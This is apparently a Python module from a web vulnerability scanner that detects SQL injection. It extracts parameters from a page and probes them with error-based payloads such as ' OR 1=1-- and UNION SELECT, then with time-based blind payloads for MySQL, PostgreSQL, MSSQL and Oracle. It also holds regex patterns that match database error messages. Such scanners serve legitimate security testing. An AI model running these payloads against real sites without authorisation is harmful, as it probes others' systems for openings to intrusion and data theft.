"""SQL injection detection -- error-based + time-based blind."""
import re
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from html.parser import HTMLParser

from scanner.modules.base import BaseModule


# ── Error-Based Payloads ────────────────────────────────────────────
ERROR_PAYLOADS = [
    "'",
    '"',
    "')",
    '")',
    "\\",
    "1' AND '1'='1",
    "1' AND '1'='2",
    "1 AND 1=1",
    "1 AND 1=2",
    "1' OR 1=1--",
    "1' UNION SELECT NULL--",
    "1; SELECT 1--",
]

# ── DB Error Keyword Patterns ───────────────────────────────────────
DB_ERROR_PATTERNS = {
    "MySQL": [
        r"SQL syntax",
        r"mysql_fetch",
        r"MySQL Error",
        r"Warning.*mysql",
        r"valid MySQL",
    ],
    "PostgreSQL": [
        r"PostgreSQL",
        r"psql",
        r"pg_query",
        r"ERROR:\s+syntax error",
    ],
    "MSSQL": [
        r"SQL Server",
        r"ODBC",
        r"mssql",
        r"SqlException",
        r"Unclosed quotation mark",
    ],
    "Oracle": [
        r"ORA-\d+",
        r"Oracle",
        r"PL/SQL",
        r"quoted string not properly terminated",
    ],
}

# ── Time-Based Sleep Payloads ────────────────────────────────────────
SLEEP_PAYLOADS = [
    {"db": "MySQL", "payload": "' OR IF(1=1,SLEEP(5),0)--"},
    {"db": "PostgreSQL", "payload": "'; SELECT pg_sleep(5)--"},
    {"db": "MSSQL", "payload": "'; WAITFOR DELAY '00:00:05'--"},
    {"db": "Oracle", "payload": "'; BEGIN DBMS_LOCK.SLEEP(5); END;--"},
]

DEFAULT_THRESHOLD = 5  # seconds


# ── Pure Functions (testable) ────────────────────────────────────────

def _check_error_patterns(text):
    """Scan response text for DB error keywords. Returns {db, keyword} or None."""
    for db, patterns in DB_ERROR_PATTERNS.items():
        for pat in patterns:
            if re.search(pat, text, re.IGNORECASE):
                return {"db": db, "keyword": pat}
    return None


def _build_baseline_time(url, send_request):
    """Send 3 normal requests, return average response time in seconds."""
    times = []
    for _ in range(3):
        start = time.perf_counter()
        try:
            send_request(url)
        except Exception:
            pass
        elapsed = time.perf_counter() - start
        times.append(elapsed)
    return sum(times) / len(times) if times else 0.0


def _make_test_url(base_url, param_name, payload):
    """Replace or append a GET parameter with the payload value."""
    parsed = list(urllib.parse.urlparse(base_url))
    query = dict(urllib.parse.parse_qsl(parsed[4]))
    query[param_name] = payload
    parsed[4] = urllib.parse.urlencode(query)
    return urllib.parse.urlunparse(parsed)


# ── HTML Form / Input Parser ─────────────────────────────────────────

class _FormParser(HTMLParser):
    """Extract form input names and URL parameter hints from HTML."""

    def __init__(self):
        super().__init__()
        self.input_names = set()
        self.param_hints = set()

    def handle_starttag(self, tag, attrs):
        attrs = dict(attrs)
        if tag == "input":
            name = attrs.get("name", "")
            if name:
                self.input_names.add(name)
        elif tag == "a":
            href = attrs.get("href", "")
            if "?" in href:
                parsed = urllib.parse.urlparse(href)
                for k in urllib.parse.parse_qs(parsed.query):
                    self.param_hints.add(k)


def _extract_params(target_url, html):
    """Extract parameter names from URL query string and HTML forms."""
    params = set()

    # From URL itself
    parsed = urllib.parse.urlparse(target_url)
    for k in urllib.parse.parse_qs(parsed.query):
        params.add(k)

    # From HTML forms/links
    parser = _FormParser()
    try:
        parser.feed(html)
    except Exception:
        pass
    params.update(parser.input_names)
    params.update(parser.param_hints)

    return list(params)


# ── SqliModule ───────────────────────────────────────────────────────

class SqliModule(BaseModule):
    name = "sqli"
    description = "Detect SQL injection via error + time-based blind"
    requires_url = True

    def run(self, target, request_handler, output):
        """Run error-based and time-based SQLi detection."""
        target = target.rstrip("/")
        output.log_progress(f"Fetching {target} for parameter extraction...")

        try:
            resp = request_handler.get(target)
            html = resp.text
        except Exception as e:
            output.log_progress(f"Failed to fetch {target}: {e}")
            return {"module": self.name, "findings": []}

        param_names = _extract_params(target, html)

        # If URL has no obvious params, try the URL query itself
        if not param_names:
            parsed = urllib.parse.urlparse(target)
            if parsed.query:
                param_names = list(urllib.parse.parse_qs(parsed.query).keys())

        if not param_names:
            output.log_progress("No testable parameters found on this page")
            return {"module": self.name, "findings": []}

        output.log_progress(f"Found {len(param_names)} potential parameters: {param_names}")

        findings = []
        time_based_targets = []
        param_has_error = set()

        # Phase 1: Error-based (fast, 3 concurrent requests)
        output.log_progress(f"Phase 1: Error-based testing ({len(ERROR_PAYLOADS)} payloads)")
        with ThreadPoolExecutor(max_workers=3) as pool:
            futures = {}
            for pname in param_names:
                for error_payload in ERROR_PAYLOADS:
                    test_url = _make_test_url(target, pname, error_payload)
                    futures[pool.submit(request_handler.get, test_url)] = (
                        pname, error_payload, test_url
                    )

            bar = output.create_progress_bar("Error-Based", len(futures))
            for future in as_completed(futures):
                pname, payload, test_url = futures[future]
                try:
                    resp = future.result()
                    match = _check_error_patterns(resp.text)
                    if match:
                        if pname not in param_has_error:
                            param_has_error.add(pname)
                            finding = {
                                "type": "error_based",
                                "parameter": pname,
                                "url": test_url,
                                "database": match["db"],
                                "evidence": (
                                    f"DB error keyword '{match['keyword']}' "
                                    f"found in response"
                                ),
                            }
                            findings.append(finding)
                            output.log_finding(self.name, finding)
                except Exception:
                    pass
                output.update_progress(bar)
            bar.close()

        # Determine which params need Phase 2
        for pname in param_names:
            if pname not in param_has_error:
                time_based_targets.append(pname)

        # Phase 2: Time-based blind for params without error matches
        if time_based_targets:
            output.log_progress(
                f"Phase 2: Time-based blind ({len(time_based_targets)} params, "
                f"{len(SLEEP_PAYLOADS)} DB types)"
            )
            with ThreadPoolExecutor(max_workers=3) as pool:
                # Compute baseline for each parameter
                param_baselines = {}
                for pname in time_based_targets:
                    base_url = _make_test_url(target, pname, "1")
                    baseline = _build_baseline_time(base_url, request_handler.get)
                    param_baselines[pname] = baseline
                    output.log_progress(f"  {pname} baseline: {baseline*1000:.0f}ms")

                # Test sleep payloads
                futures = {}
                for pname in time_based_targets:
                    for sp in SLEEP_PAYLOADS:
                        test_url = _make_test_url(target, pname, sp["payload"])
                        futures[pool.submit(
                            self._timed_request, request_handler.get, test_url
                        )] = (
                            pname, sp["db"], sp["payload"], test_url,
                            param_baselines[pname],
                        )

                bar = output.create_progress_bar("Time-Based", len(futures))
                for future in as_completed(futures):
                    pname, db, payload, test_url, baseline = futures[future]
                    try:
                        elapsed = future.result()
                        threshold = max(baseline * 3, DEFAULT_THRESHOLD)
                        if elapsed is not None and elapsed > threshold:
                            finding = {
                                "type": "time_based",
                                "parameter": pname,
                                "url": test_url,
                                "database": db,
                                "baseline_ms": round(baseline * 1000),
                                "response_ms": round(elapsed * 1000),
                                "evidence": (
                                    f"Response delayed {elapsed*1000:.0f}ms "
                                    f"vs baseline {baseline*1000:.0f}ms"
                                ),
                            }
                            findings.append(finding)
                            output.log_finding(self.name, finding)
                    except Exception:
                        pass
                    output.update_progress(bar)
                bar.close()

        output.log_progress(f"SQLi scan done: {len(findings)} potential injections found")
        return {"module": self.name, "findings": findings}

    def _timed_request(self, get_func, url):
        """Make a request and return elapsed time in seconds, or None on failure."""
        start = time.perf_counter()
        try:
            get_func(url)
            return time.perf_counter() - start
        except Exception:
            return None
